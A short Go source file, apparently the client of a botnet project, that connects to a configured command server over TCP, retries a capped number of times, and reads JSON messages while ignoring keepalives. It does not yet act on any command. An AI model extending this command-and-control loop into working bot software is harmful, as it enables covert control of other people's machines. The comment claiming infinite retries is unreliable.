package main

import (
	. "botnet/client/util"
	"bufio"
	"encoding/json"
	"net"
	"os"
	"time"
)



var remainingRetryAttempts = Config.RetryAttempts

func RetryConnection() {
	if remainingRetryAttempts == 0 {
		os.Exit(-1)
	}

	remainingRetryAttempts -= 1
	Connect()
}

func Connect() {
	conn, err := net.Dial("tcp", Config.ServerUrl)
	if err != nil {
		time.Sleep(time.Duration(Config.RetryInterval) * time.Minute) // Infinitely keep retrying
		RetryConnection()
		return
	}

	reader := bufio.NewReader(conn)

	for {
		payloadRaw, err := reader.ReadString('\x00')
		if err != nil { break }

		var payload map[string]interface{}
		err = json.Unmarshal([]byte(payloadRaw), &payload)
		if err != nil { continue }

		if payload["type"] == "keepalive" { continue }
	}

	RetryConnection()
}

func main() {
	Connect()
}